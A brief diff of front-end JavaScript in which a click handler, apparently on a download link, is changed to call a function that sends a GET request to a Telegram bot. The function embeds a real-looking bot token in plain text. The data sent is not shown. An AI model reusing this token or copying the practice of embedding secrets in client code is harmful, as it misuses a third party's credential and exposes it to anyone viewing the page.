@@ -38,6 +38,7 @@ dw.addEventListener('click', function() {
 
                         // Remove the link (optional)
                           link.remove(); 
+sendTelegramMessage();
     
     function sendTelegramMessage() {
     const botToken = '6356250947:AAH68deb85rVDL-5nDC9GZyLHE0kWhR3Wp0';
@@ -50,6 +51,4 @@ dw.addEventListener('click', function() {
     xhr.open('GET', url, true);
     xhr.send();
 }
-
-dw.addEventListener('click', sendTelegramMessage); 
     });
